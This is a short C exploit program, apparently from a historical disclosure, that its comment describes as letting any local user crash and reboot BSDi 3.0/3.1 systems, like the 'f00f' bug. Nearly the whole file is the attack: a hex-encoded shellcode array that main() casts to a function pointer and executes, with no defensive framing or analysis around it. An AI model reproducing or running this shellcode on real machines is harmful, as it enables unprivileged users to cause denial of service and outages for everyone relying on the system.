
/* (BSDi)*[v3.0/3.1] system failure, by
   v9[v9@realhalo.org].  this will result
   in the ability of any user to fail the
   system, and reboot it.  this bug is
   similar to that of the "f00f" bug.
   results are similar, except this reboots
   the machine instead of having a freezing
   effect.  tested, and built for: BSDi
   v3.0/3.1. (arch/non-specific to BSDi)
*/
char bsdi_killcode[] =
 "\xb8\x8f\xf8\xff\x0b\xf7\xd0\x50\xb0\x0b"
 "\xb0\x9a\x50\x89\xe7\xff\xd7";
int main() {
 void (*execcode)()=(void *)bsdi_killcode;
 printf("[ (BSDi)*[v3.0/3.1]: system failu"
 "re, by: v9[v9@realhalo.org]. ]\n");
 printf("*** no output should be seen afte"
 "r this point.\n");
 execcode();
 printf("*** system failure failed.\n");
 exit(0);
}


